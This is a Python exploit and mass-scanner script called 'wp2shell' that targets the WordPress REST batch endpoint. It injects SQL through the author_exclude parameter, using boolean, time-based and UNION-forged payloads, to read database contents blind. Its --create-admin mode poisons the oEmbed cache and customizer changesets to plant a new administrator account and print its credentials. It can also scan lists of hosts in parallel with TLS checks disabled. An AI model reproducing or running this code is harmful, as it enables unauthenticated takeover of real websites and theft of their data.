#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import hashlib
import uuid
import argparse
import concurrent.futures
import json
import re
import secrets
import ssl
import statistics
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from collections import Counter
from http.cookiejar import CookieJar

__version__ = "3.3-stable-verbose"

VERBOSE = False

def vlog(msg):
    if VERBOSE:
        sys.stderr.write("[VERBOSE] " + msg + "\n")
        sys.stderr.flush()

class KeepPost(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        if req.get_method() == "POST" and code in (301, 302, 303, 307, 308):
            hdrs = {k: v for k, v in req.header_items() if k.lower() != "content-length"}
            return urllib.request.Request(newurl, data=req.data, headers=hdrs,
                                          origin_req_host=req.origin_req_host,
                                          unverifiable=True, method="POST")
        return super().redirect_request(req, fp, code, msg, headers, newurl)

class Target:
    def __init__(self, base, timeout=15, proxy=None, sleep=4.0, route="auto",
                 delivery="auto", slot="auto"):
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.sleep = float(sleep)
        self.route = route
        self.delivery = delivery
        self.multipart = (delivery == "multipart")
        self._delivery_resolved = (delivery != "auto")
        self.slot = slot
        self._slot = "users" if slot == "auto" else slot
        self._proxy = proxy
        self.batch = None
        self._mp_ep = None
        self._base = 0.0
        self._normalized = False
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        opener_handlers = [urllib.request.HTTPSHandler(context=ctx), KeepPost(),
                           urllib.request.HTTPCookieProcessor(CookieJar())]
        if proxy:
            opener_handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
        else:
            opener_handlers.append(urllib.request.ProxyHandler({}))
        self.opener = urllib.request.build_opener(*opener_handlers)

    UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"

    def normalize(self):
        if self._normalized:
            return
        self._normalized = True
        try:
            req = urllib.request.Request(self.base + "/", headers={"User-Agent": self.UA})
            with self.opener.open(req, timeout=self.timeout) as r:
                u = urllib.parse.urlparse(r.geturl())
                if u.scheme and u.netloc:
                    canon = "%s://%s" % (u.scheme, u.netloc)
                    if canon != self.base:
                        self.base = canon
                        self.batch = None
                        vlog("Normalized base to: " + self.base)
        except Exception as e:
            vlog("Normalize failed: " + str(e))

    def _request(self, url, data=None, headers=None, method=None):
        hdrs = dict(headers or {})
        hdrs.setdefault("User-Agent", self.UA)
        hdrs.setdefault("Accept", "application/json, text/plain, */*")
        req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        t0 = time.perf_counter()
        vlog(f"REQUEST {method or 'GET'} {url}")
        try:
            with self.opener.open(req, timeout=self.timeout) as r:
                body = r.read()
                elapsed = time.perf_counter() - t0
                vlog(f"RESPONSE {r.status} in {elapsed:.3f}s (len={len(body)})")
                return r.status, elapsed, body, r.geturl()
        except urllib.error.HTTPError as e:
            elapsed = time.perf_counter() - t0
            vlog(f"HTTPERROR {e.code} in {elapsed:.3f}s")
            return e.code, elapsed, e.read(), getattr(e, "url", url)
        except Exception as e:
            vlog(f"EXCEPTION: {str(e)}")
            raise

    def _endpoints(self):
        if self.route == "wp-json":
            return [self.base + "/wp-json/batch/v1"]
        if self.route == "rest-route":
            return [self.base + "/?rest_route=/batch/v1"]
        return [self.base + "/?rest_route=/batch/v1", self.base + "/wp-json/batch/v1"]

    def _envelope(self, author_exclude):
        enc = urllib.parse.quote(author_exclude, safe="")
        if self._slot == "posts-item":
            probe = {"method": "GET", "path": "/wp/v2/posts/1?author_exclude=" + enc}
        else:
            probe = {"method": "GET", "path": "/wp/v2/users?author_exclude=" + enc}
        inner = {"requests": [
            {"method": "POST", "path": "///"},
            probe,
            {"method": "GET", "path": "/wp/v2/posts"},
        ]}
        return {"requests": [
            {"method": "POST", "path": "/v2/categories", "body": {"name": "x"}},
            {"method": "POST", "path": "///", "body": {"name": "x"}},
            {"method": "POST", "path": "/wp/v2/posts", "body": inner},
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]}

    @staticmethod
    def _flatten(fields, name, val):
        if isinstance(val, dict):
            for k, v in val.items():
                Target._flatten(fields, "%s[%s]" % (name, k), v)
        elif isinstance(val, list):
            for i, v in enumerate(val):
                Target._flatten(fields, "%s[%d]" % (name, i), v)
        else:
            fields.append((name, "" if val is None else str(val)))

    def _multipart_encode(self, fields):
        boundary = "----WebKitFormBoundary%s" % secrets.token_hex(8)
        out = []
        for name, value in fields:
            out.append(("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n"
                        % (boundary, name, value)).encode())
        out.append(("--%s--\r\n" % boundary).encode())
        return "multipart/form-data; boundary=%s" % boundary, b"".join(out)

    def _send(self, author_exclude):
        self.normalize()
        env = self._envelope(author_exclude)
        if self.multipart:
            fields = [("rest_route", "/batch/v1"), ("validation", "normal")]
            for i, req in enumerate(env["requests"]):
                self._flatten(fields, "requests[%d]" % i, req)
            ctype, body = self._multipart_encode(fields)
            hdrs = {"Content-Type": ctype}
            if self._mp_ep is None:
                for ep in (self.base + "/", self.base + "/index.php"):
                    try:
                        st, el, resp, _ = self._request(ep, data=body, headers=hdrs, method="POST")
                        if st in (200, 207):
                            self._mp_ep = ep
                            vlog(f"Multipart endpoint chosen: {ep}")
                            return st, el, resp
                    except Exception:
                        continue
                self._mp_ep = self.base + "/"
            st, el, resp, _ = self._request(self._mp_ep, data=body, headers=hdrs, method="POST")
            return st, el, resp
        body = json.dumps(env).encode()
        headers = {"Content-Type": "application/json"}
        if self.batch is None:
            for ep in self._endpoints():
                try:
                    st, _, _, final = self._request(ep, data=body, headers=headers, method="POST")
                    if st in (200, 207):
                        self.batch = final
                        vlog(f"Batch endpoint chosen: {final}")
                        break
                except Exception:
                    continue
            if self.batch is None:
                self.batch = self._endpoints()[0]
                vlog(f"Batch fallback: {self.batch}")
        st, el, resp, _ = self._request(self.batch, data=body, headers=headers, method="POST")
        return st, el, resp

    def probe(self, author_exclude):
        st, el, _ = self._send(author_exclude)
        return st, el

    @staticmethod
    def _sleep_payload(seconds):
        return "0) OR (SELECT 1 FROM (SELECT SLEEP(%g))x)-- -" % seconds

    def time_test(self, rounds=3):
        vlog(f"Time test with sleep={self.sleep}, rounds={rounds}")
        fasts = []
        for i in range(rounds):
            try:
                _, el = self.probe(self._sleep_payload(0))
                fasts.append(el)
                vlog(f"  fast probe {i+1}: {el:.3f}s")
            except Exception as e:
                vlog(f"  fast probe {i+1} failed: {e}")
                fasts.append(self.timeout)
        fast_median = statistics.median(fasts)
        vlog(f"Fast median: {fast_median:.3f}s")

        slows = []
        for i in range(rounds):
            try:
                _, el = self.probe(self._sleep_payload(self.sleep))
                slows.append(el)
                vlog(f"  slow probe {i+1}: {el:.3f}s")
            except Exception as e:
                vlog(f"  slow probe {i+1} failed: {e}")
                slows.append(self.timeout)
        slow_median = statistics.median(slows)
        vlog(f"Slow median: {slow_median:.3f}s")

        self._base = fast_median
        delta = slow_median - fast_median
        vlog(f"Delta: {delta:.3f}s")

        vuln = delta >= (self.sleep * 0.6) and fast_median < (self.sleep * 0.5)
        vlog(f"Vulnerable: {vuln}")
        return {"fast": fast_median, "slow": slow_median, "delta": delta, "vuln": vuln}

    @staticmethod
    def _bool_payload(truth):
        return "0) AND 1=%d-- -" % (1 if truth else 12)

    @staticmethod
    def _harvest(body):
        try:
            doc = json.loads(body)
        except Exception:
            return None, 0
        totals, posts = [], [0]
        def walk(o):
            if isinstance(o, dict):
                h = o.get("headers")
                if isinstance(h, dict) and "X-WP-Total" in h:
                    try:
                        totals.append(int(h["X-WP-Total"]))
                    except (TypeError, ValueError):
                        pass
                for v in o.values():
                    walk(v)
            elif isinstance(o, list):
                if o and all(isinstance(e, dict) for e in o) and any(
                        "id" in e and ("title" in e or "content" in e or "slug" in e) for e in o):
                    posts[0] += sum(1 for e in o if "id" in e)
                for e in o:
                    walk(e)
        walk(doc)
        return (max(totals) if totals else None), posts[0]

    @staticmethod
    def _has_responses(body):
        try:
            doc = json.loads(body)
        except Exception:
            return False
        def walk(o):
            if isinstance(o, dict):
                if isinstance(o.get("responses"), list):
                    return True
                return any(walk(v) for v in o.values())
            if isinstance(o, list):
                return any(walk(e) for e in o)
            return False
        return walk(doc)

    def bool_test(self):
        vlog("Boolean test")
        try:
            _, _, tb = self._send(self._bool_payload(True))
            _, _, fb = self._send(self._bool_payload(False))
        except Exception as e:
            vlog(f"Boolean test exception: {e}")
            return {"vuln": False, "processed": False, "signal": "none",
                    "true_total": None, "false_total": None,
                    "true_posts": 0, "false_posts": 0, "true_len": 0, "false_len": 0}
        t_total, t_posts = self._harvest(tb)
        f_total, f_posts = self._harvest(fb)
        by_total = (t_total is not None and f_total is not None and t_total > 0 and f_total == 0)
        by_posts = (t_posts > 0 and f_posts == 0)
        by_len = ((len(tb) - len(fb)) > 200 and f_posts == 0 and t_posts > 0)
        signal = ("x-wp-total" if by_total else "post-count" if by_posts
                  else "body-length" if by_len else "none")
        processed = self._has_responses(tb) or self._has_responses(fb)
        vuln = bool(by_total or by_posts or by_len)
        vlog(f"Boolean result: vuln={vuln}, signal={signal}, true_total={t_total}, false_total={f_total}, true_posts={t_posts}, false_posts={f_posts}")
        return {"vuln": vuln, "processed": processed,
                "signal": signal, "true_total": t_total, "false_total": f_total,
                "true_posts": t_posts, "false_posts": f_posts,
                "true_len": len(tb), "false_len": len(fb)}

    def _set_delivery(self, name):
        self.multipart = (name == "multipart")

    def _delivery_name(self):
        return "multipart" if self.multipart else "json"

    def _set_slot(self, name):
        self._slot = name

    def _batch_works(self):
        try:
            st, _, body = self._send("0")
        except Exception:
            return False
        return st in (200, 207) and self._has_responses(body)

    def _resolve_delivery(self):
        if self._delivery_resolved:
            return
        self._delivery_resolved = True
        self._set_delivery("json")
        vlog("Trying JSON delivery")
        if self._batch_works():
            vlog("JSON delivery works")
            return
        self._set_delivery("multipart")
        vlog("Trying multipart delivery")
        if self._batch_works():
            vlog("Multipart delivery works")
            return
        self._set_delivery("json")
        vlog("Falling back to JSON")

    def detect(self, method="auto", rounds=3):
        vlog(f"Detect: method={method}, rounds={rounds}")
        deliveries = ["json", "multipart"] if self.delivery == "auto" else [self.delivery]
        slots = ["users", "posts-item"] if self.slot == "auto" else [self.slot]
        bool_results = {}
        if method in ("auto", "boolean"):
            for slot in slots:
                self._set_slot(slot)
                for d in deliveries:
                    self._set_delivery(d)
                    vlog(f"Testing slot={slot}, delivery={d}")
                    br = self.bool_test()
                    bool_results[(slot, d)] = br
                    if br["vuln"]:
                        vlog(f"Boolean positive: slot={slot}, delivery={d}")
                        return {"vuln": True, "method": "boolean", "delivery": d,
                                "slot": slot, "bool": br}
        last_time = None
        if method in ("auto", "time"):
            proc = [k for k, b in bool_results.items() if b.get("processed")]
            for (slot, d) in (proc[:1] or [(slots[0], deliveries[0])]):
                self._set_slot(slot)
                self._set_delivery(d)
                vlog(f"Time test with slot={slot}, delivery={d}")
                tr = self.time_test(rounds=rounds)
                last_time = (slot, d, tr)
                if tr["vuln"]:
                    vlog(f"Time positive: slot={slot}, delivery={d}")
                    return {"vuln": True, "method": "time", "delivery": d,
                            "slot": slot, "time": tr}
        if last_time:
            neg_slot, neg_delivery = last_time[0], last_time[1]
        else:
            neg_slot = slots[0]
            neg_delivery = deliveries[0] if deliveries else self._delivery_name()
        self._set_slot(neg_slot)
        self._set_delivery(neg_delivery)
        vlog(f"Falling back to slot={neg_slot}, delivery={neg_delivery}")
        return {"vuln": False, "method": None, "delivery": neg_delivery, "slot": neg_slot,
                "bool": bool_results, "time": (last_time[2] if last_time else None)}

    def _oracle(self, cond, unit=0.6):
        payload = "0) OR (SELECT 1 FROM (SELECT IF((%s),SLEEP(%g),0))x)-- -" % (cond, unit)
        _, el = self.probe(payload)
        return el > (self._base + unit * 0.6)

    def read_scalar(self, expr, maxlen=40, unit=0.6):
        v = "COALESCE((%s),'')" % expr
        lo, hi = 0, maxlen
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self._oracle("CHAR_LENGTH(%s)>=%d" % (v, mid), unit):
                lo = mid
            else:
                hi = mid - 1
        out = ""
        for pos in range(1, lo + 1):
            a, b = 32, 126
            while a < b:
                mid = (a + b + 1) // 2
                if self._oracle("ASCII(SUBSTRING(%s,%d,1))>=%d" % (v, pos, mid), unit):
                    a = mid
                else:
                    b = mid - 1
            out += chr(a)
        return out

    def read_int(self, query, unit=0.6):
        expr = "COALESCE((%s),0)" % query
        lo, hi = 0, 1
        while self._oracle("%s >= %d" % (expr, hi), unit):
            lo, hi = hi, hi * 2
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self._oracle("%s >= %d" % (expr, mid), unit):
                lo = mid
            else:
                hi = mid - 1
        return lo

    PRIMER = "http://:"
    EMBED_ATTR = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'

    def _rce_send(self, inner_requests, timeout=None):
        payload = {"requests": [
            {"method": "POST", "path": self.PRIMER},
            {"method": "POST", "path": "/wp/v2/posts",
             "body": {"requests": inner_requests}},
            {"method": "POST", "path": "/batch/v1"},
        ]}
        ep = self.batch or self._endpoints()[0]
        body = json.dumps(payload).encode()
        hdrs = {"Content-Type": "application/json", "User-Agent": self.UA}
        req = urllib.request.Request(ep, data=body, headers=hdrs, method="POST")
        try:
            with self.opener.open(req, timeout=timeout or self.timeout) as resp:
                return resp.read()
        except urllib.error.HTTPError as e:
            return e.read()

    @staticmethod
    def _hex(value):
        return "0x%s" % value.encode().hex() if value else "''"

    def _post_row(self, post_id, content, title, status, name, parent, post_type):
        h = self._hex
        return ",".join((
            str(post_id), "1",
            h("2020-01-01 00:00:00"), h("2020-01-01 00:00:00"),
            h(content), h(title), "''",
            h(status), h("closed"), h("closed"), "''",
            h(name), "''", "''",
            h("2020-01-01 00:00:00"), h("2020-01-01 00:00:00"), "''",
            str(parent), "''", "0",
            h(post_type), "''", "0",
        ))

    READ_PER_PAGE = 100000

    def _forge(self, rows, extra_requests=(), per_page=-1):
        query = ("1) AND 1=0 UNION ALL SELECT "
                 + " UNION ALL SELECT ".join(rows) + " -- -")
        return self._rce_send([
            {"method": "GET", "path": self.PRIMER},
            {"method": "GET", "path": "/wp/v2/widgets?"
             + urllib.parse.urlencode({"author_exclude": query, "per_page": per_page,
                                       "orderby": "none", "context": "view"})},
            {"method": "GET", "path": "/wp/v2/posts"},
            *extra_requests,
        ], timeout=60)

    def _read_row(self, post_id, title_sql):
        h = self._hex
        d = h("2020-01-01 00:00:00")
        return ",".join((
            str(post_id), "1", d, d,
            "''", title_sql, "''",
            h("publish"), h("closed"), h("closed"), "''",
            h("rd%d" % post_id), "''", "''",
            d, d, "''",
            "0", "''", "0",
            h("post"), "''", "0",
        ))

    def _inband_read(self, exprs, timeout=60):
        markers = ["MK" + "".join(secrets.choice("GHJKLMNPQRSTVWXYZ") for _ in range(9))
                   for _ in exprs]
        base_id = 1900000000 + secrets.randbelow(90000000)
        rows = [self._read_row(
                    base_id + i,
                    "CONCAT(0x%s,HEX(CAST((%s) AS CHAR)),0x%s)"
                    % (mk.encode().hex(), expr, mk.encode().hex()))
                for i, (expr, mk) in enumerate(zip(exprs, markers))]
        body = self._forge(rows, per_page=self.READ_PER_PAGE) or b""
        text = body.decode("utf-8", "replace")
        out = []
        for mk in markers:
            m = re.search(re.escape(mk) + r"([0-9A-Fa-f]*)" + re.escape(mk), text)
            hx = m.group(1) if m else ""
            if not hx or len(hx) % 2:
                out.append(None)
                continue
            try:
                out.append(bytes.fromhex(hx).decode("utf-8", "replace"))
            except ValueError:
                out.append(None)
        return out

    def read_scalar_fast(self, expr, blind_maxlen=64):
        try:
            vals = self._inband_read([expr])
            if vals and vals[0] is not None:
                return vals[0]
        except Exception:
            pass
        return self.read_scalar(expr, blind_maxlen)

    def read_int_fast(self, query):
        try:
            vals = self._inband_read([query])
            if vals and vals[0]:
                m = re.match(r"-?\d+", vals[0].strip())
                if m:
                    return int(m.group(0))
        except Exception:
            pass
        return self.read_int(query)

    def create_admin(self):
        vlog("Creating admin...")
        self.normalize()
        sentinel = secrets.token_hex(8)
        try:
            echo = self._inband_read(["0x%s" % sentinel.encode().hex()])
        except Exception:
            echo = [None]
        if not echo or echo[0] != sentinel:
            raise RuntimeError("preflight row-forgery failed")
        try:
            with self.opener.open(
                urllib.request.Request(
                    self.base + "/?rest_route=/wp/v2/posts&per_page=1&_fields=link",
                    headers={"User-Agent": self.UA}), timeout=15) as resp:
                items = json.loads(resp.read())
        except Exception:
            items = []
        if not items or not items[0].get("link"):
            raise RuntimeError("no published post for oEmbed anchor")
        link = urllib.parse.urlsplit(items[0]["link"])
        token = secrets.token_hex(6)
        embed_urls = [
            urllib.parse.urlunsplit((
                link.scheme, link.netloc, link.path, link.query,
                "%s%d" % (token, i)))
            for i in range(3)]
        seed_content = "".join(
            '[embed width="500" height="750"]%s[/embed]' % u for u in embed_urls)
        self._forge([self._post_row(
            0, seed_content, "seed", "publish", "seed", 0, "post")])
        posts_table = self.read_scalar_fast(
            "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES "
            "WHERE TABLE_SCHEMA=DATABASE() "
            "AND RIGHT(TABLE_NAME,6)=0x5f706f737473 "
            "ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1", 64)
        if not re.fullmatch(r"[A-Za-z0-9_$]+", posts_table):
            raise RuntimeError("table prefix not resolved (%r)" % posts_table)
        prefix = posts_table[:-5]
        admin_id = self.read_int_fast(
            "SELECT u.ID FROM `%susers` u JOIN `%susermeta` m "
            "ON m.user_id=u.ID WHERE m.meta_key=%s "
            "AND INSTR(m.meta_value,%s)>0 "
            "ORDER BY u.ID LIMIT 1" % (
                prefix, prefix,
                self._hex(prefix + "capabilities"),
                self._hex('s:13:"administrator";b:1;')))
        if admin_id < 1:
            raise RuntimeError("no admin found")
        cache_queries = [
            "SELECT ID FROM `%s` WHERE post_type=0x6f656d6265645f6361636865 "
            "AND post_name=0x%s ORDER BY ID DESC LIMIT 1" % (
                posts_table,
                hashlib.md5((u + self.EMBED_ATTR).encode()).hexdigest().encode().hex())
            for u in embed_urls]
        cache_ids = []
        try:
            vals = self._inband_read(cache_queries)
        except Exception:
            vals = [None] * len(cache_queries)
        for q, v in zip(cache_queries, vals):
            pid = int(re.match(r"\d+", v.strip()).group(0)) if v and re.match(r"\d+", v.strip()) else 0
            if pid < 1:
                pid = self.read_int(q)
            if pid < 1:
                raise RuntimeError("oEmbed cache seed failed")
            cache_ids.append(pid)
        if len(set(cache_ids)) != 3:
            raise RuntimeError("oEmbed cache IDs not distinct")
        username = "w2s_%s" % token
        password = "W2s!%s" % secrets.token_urlsafe(15)
        email = "%s@wp2shell.local" % username
        outer = 1800000000 + secrets.randbelow(100000000)
        nav_id, inner_id = outer + 1, outer + 2
        changeset = json.dumps({
            "nav_menu_item[%d]" % nav_id: {
                "value": {
                    "object_id": 0, "object": "", "menu_item_parent": 0,
                    "position": 0, "type": "custom", "title": "proof",
                    "url": "https://github.com/dinosn/wp2shell-lab",
                    "target": "", "attr_title": "", "description": "proof",
                    "classes": "", "xfn": "", "status": "publish",
                    "nav_menu_term_id": 0, "_invalid": False,
                },
                "type": "nav_menu_item", "user_id": admin_id,
            }
        }, separators=(",", ":"))
        poisoned = (
            self._post_row(0,
                '[embed width="500" height="750"]%s[/embed]' % embed_urls[1],
                "trigger", "publish", "trigger", 0, "post"),
            self._post_row(cache_ids[0], changeset, "changeset", "future",
                str(uuid.uuid4()), outer, "customize_changeset"),
            self._post_row(outer, "outer", "outer", "draft",
                "outer", cache_ids[0], "post"),
            self._post_row(cache_ids[1], "", "cache", "publish",
                "cache", cache_ids[0], "post"),
            self._post_row(nav_id, "nav", "nav", "publish",
                "nav", cache_ids[2], "nav_menu_item"),
            self._post_row(cache_ids[2], "parse", "parse", "parse",
                "parse", inner_id, "request"),
            self._post_row(inner_id, "inner", "inner", "draft",
                "inner", cache_ids[2], "post"),
        )
        new_admin = {"username": username, "email": email,
                     "password": password, "roles": ["administrator"]}
        self._forge(poisoned, extra_requests=[
            {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
            {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
        ])
        return username, password, email


def fingerprint_version(t):
    cb = "wpcb%s" % secrets.token_hex(4)
    nocache = {"Cache-Control": "no-cache", "Pragma": "no-cache"}
    core_asset = (r'(?:block-library/style(?:\.min)?\.css|wp-emoji-release(?:\.min)?\.js'
                  r'|wp-embed(?:\.min)?\.js)\?ver=([0-9]+\.[0-9]+(?:\.[0-9]+)?)')
    for path, pat in (("/", core_asset),
                      ("/", r'content="WordPress\s+([0-9.]+)"'),
                      ("/feed/", r"<generator>\s*https?://wordpress\.org/\?v=([0-9.]+)"),
                      ("/readme.html", r"Version\s+([0-9.]+)")):
        url = t.base + path + ("&" if "?" in path else "?") + cb
        try:
            _, _, body, _ = t._request(url, headers=nocache)
            m = re.search(pat, body.decode("utf-8", "replace"))
            if m:
                return m.group(1)
        except Exception:
            pass
    return None

FULL_CHAIN = [((6, 9, 0), (6, 9, 4)), ((7, 0, 0), (7, 0, 1))]
SINK_ONLY = [((6, 8, 0), (6, 8, 5))]

def _ver_tuple(s):
    m = re.match(r"(\d+)\.(\d+)(?:\.(\d+))?", s)
    return (int(m.group(1)), int(m.group(2)), int(m.group(3) or 0)) if m else None

def version_verdict(ver):
    vt = _ver_tuple(ver) if ver else None
    if not vt:
        return "unknown"
    if any(lo <= vt <= hi for lo, hi in FULL_CHAIN):
        return "affected-full-chain"
    if any(lo <= vt <= hi for lo, hi in SINK_ONLY):
        return "affected-sqli-sink-only"
    return "outside-affected-range"

def scan_target(url, args):
    t = Target(url, timeout=args.timeout, proxy=args.proxy, sleep=args.sleep,
               route=args.route, delivery=args.delivery, slot=args.slot)
    rec = {"target": url}
    try:
        res = t.detect(method=args.method, rounds=args.rounds)
    except Exception as e:
        rec.update(status="error", error=str(e))
        return rec, 2

    active = res["vuln"]
    rec["delivery"] = res.get("delivery")
    rec["slot"] = res.get("slot")
    if active:
        rec["method"] = res["method"]
        if res["method"] == "boolean":
            br = res["bool"]
            rec["bool_signal"] = br["signal"]
            rec["bool_true_rows"] = br["true_total"] if br["true_total"] is not None else br["true_posts"]
            rec["bool_false_rows"] = br["false_total"] if br["false_total"] is not None else br["false_posts"]
    tr = res.get("time")
    if isinstance(tr, dict) and "fast" in tr:
        rec["fast_s"] = round(tr["fast"], 3)
        rec["slow_s"] = round(tr["slow"], 3)
        rec["delta_s"] = round(tr["delta"], 3)

    ver = fingerprint_version(t)
    rec["wp_version"] = ver
    rec["version_verdict"] = version_verdict(ver)
    rec["active_check"] = "fired" if active else "negative"
    if active:
        rec["status"] = "vulnerable"
        rec["confirmed"] = "unauthenticated SQL injection"
    elif ver and version_verdict(ver) in ("affected-full-chain", "affected-sqli-sink-only"):
        rec["status"] = "affected_version"
        rec["note"] = "version affected but injection did not fire (WAF/throttle)"
    else:
        rec["status"] = "not_vulnerable"
    code = 0 if rec["status"] in ("vulnerable", "affected_version") else 1

    if active and args.proof:
        try:
            dbv = t.read_scalar_fast("@@version")
            cur = t.read_scalar_fast("current_user()")
            rec["proof"] = {"@@version": dbv, "current_user()": cur}
        except Exception as e:
            rec["proof_error"] = str(e)
    return rec, code

def human_scan(rec):
    tag = {"vulnerable": "VULNERABLE", "affected_version": "AFFECTED (version)",
           "not_vulnerable": "not vulnerable", "error": "ERROR"}[rec["status"]]
    line = "[%s] %s" % (tag, rec["target"])
    if rec.get("wp_version"):
        line += "  (WP %s, %s)" % (rec["wp_version"], rec["version_verdict"])
    if rec["status"] == "error":
        line += "  -- %s" % rec.get("error")
    else:
        bits = []
        if rec.get("method") == "boolean":
            bits.append("bool rows(T/F)=%s/%s via %s" % (
                rec.get("bool_true_rows"), rec.get("bool_false_rows"), rec.get("bool_signal")))
        if "delta_s" in rec:
            bits.append("time Δ=%.2fs" % rec["delta_s"])
        if rec.get("delivery"):
            bits.append("delivery=%s" % rec["delivery"])
        if rec.get("slot"):
            bits.append("slot=%s" % rec["slot"])
        if bits:
            line += "  [active=%s | %s]" % (rec.get("active_check", "?"), " | ".join(bits))
    out = [line]
    if rec.get("confirmed"):
        out.append("        confirmed: " + rec["confirmed"])
    if rec.get("note"):
        out.append("        note: " + rec["note"])
    if rec.get("proof"):
        for k, v in rec["proof"].items():
            out.append("        proof %s = %s" % (k, v))
    return "\n".join(out)

def main():
    global VERBOSE
    p = argparse.ArgumentParser(description="wp2shell Stable SQLi Scanner (CVE-2026-63030/60137)")
    p.add_argument("url", nargs="?", help="target base URL")
    p.add_argument("--create-admin", action="store_true", help="create admin account")
    p.add_argument("--proof", action="store_true", help="read @@version + current_user()")
    p.add_argument("-f", "--file", help="file with one target per line")
    p.add_argument("--verbose", action="store_true", help="show detailed logs")
    p.add_argument("--route", choices=("auto", "rest-route", "wp-json"), default="auto")
    p.add_argument("--method", choices=("auto", "boolean", "time"), default="auto")
    p.add_argument("--delivery", choices=("auto", "json", "multipart"), default="auto")
    p.add_argument("--multipart", action="store_true", help="alias for --delivery multipart")
    p.add_argument("--slot", choices=("auto", "users", "posts-item"), default="auto")
    p.add_argument("--sleep", type=float, default=4.0)
    p.add_argument("--rounds", type=int, default=3)
    p.add_argument("--timeout", type=float, default=15.0)
    p.add_argument("--proxy", help="HTTP proxy")
    p.add_argument("-t", "--threads", type=int, default=10)
    p.add_argument("--json", action="store_true", help="JSON output")
    args = p.parse_args()
    if args.multipart:
        args.delivery = "multipart"
    VERBOSE = args.verbose

    if args.create_admin:
        if not args.url:
            p.error("--create-admin requires a single URL")
        url = args.url if "://" in args.url else "http://" + args.url
        t = Target(url, timeout=max(args.timeout, 30), proxy=args.proxy,
                   sleep=args.sleep, route=args.route, delivery="json", slot=args.slot)
        try:
            res = t.detect(method=args.method, rounds=args.rounds)
        except Exception as e:
            print("[-] Error: %s" % e)
            return 2
        if not res["vuln"]:
            print("[-] Not vulnerable")
            return 1
        print("[+] Vulnerable (method=%s slot=%s delivery=%s)" % (res["method"], res.get("slot"), res.get("delivery")))
        if t._base <= 0:
            try:
                t.detect(rounds=1)
            except Exception:
                pass
        try:
            user, pw, email = t.create_admin()
        except Exception as e:
            print("[-] Admin creation failed: %s" % e)
            return 2
        print("\n[+] ADMIN CREATED")
        print("=" * 50)
        print("    Username : %s" % user)
        print("    Password : %s" % pw)
        print("    Email    : %s" % email)
        print("    Login at: %s/wp-admin" % t.base)
        return 0

    targets = []
    if args.file:
        with open(args.file) as fh:
            targets = [ln.strip() for ln in fh if ln.strip() and not ln.strip().startswith("#")]
    if args.url:
        targets.insert(0, args.url)
    if not targets:
        p.error("provide target URL or -f hosts.txt")

    def prep(u):
        return u if "://" in u else "http://" + u

    def work(idx, u):
        try:
            rec, _ = scan_target(prep(u), args)
        except Exception as e:
            rec = {"target": prep(u), "status": "error", "error": repr(e)}
        return idx, rec

    total = len(targets)
    workers = max(1, min(args.threads, total))
    results = [None] * total
    lock = threading.Lock()
    done = [0]

    def emit(idx, rec):
        results[idx] = rec
        with lock:
            done[0] += 1
            if args.json:
                sys.stderr.write("\r  scanned %d/%d" % (done[0], total))
                sys.stderr.flush()
            else:
                pfx = "[%d/%d] " % (done[0], total) if total > 1 else ""
                print(pfx + human_scan(rec), flush=True)

    if workers == 1:
        for i, u in enumerate(targets):
            emit(*work(i, u))
    else:
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
            futs = [ex.submit(work, i, u) for i, u in enumerate(targets)]
            try:
                for fut in concurrent.futures.as_completed(futs):
                    emit(*fut.result())
            except KeyboardInterrupt:
                sys.stderr.write("\ninterrupted\n")
                ex.shutdown(wait=False, cancel_futures=True)

    results = [r for r in results if r is not None]
    if args.json:
        sys.stderr.write("\n")
        print(json.dumps(results, indent=2))

    c = Counter(r["status"] for r in results)
    sys.stderr.write("\nsummary: %d scanned | vuln=%d  affected=%d  not_vuln=%d  error=%d\n" % (
                         len(results), c.get("vulnerable", 0), c.get("affected_version", 0),
                         c.get("not_vulnerable", 0), c.get("error", 0)))

    if any(r["status"] in ("vulnerable", "affected_version") for r in results):
        return 0
    return 1

if __name__ == "__main__":
    sys.exit(main())
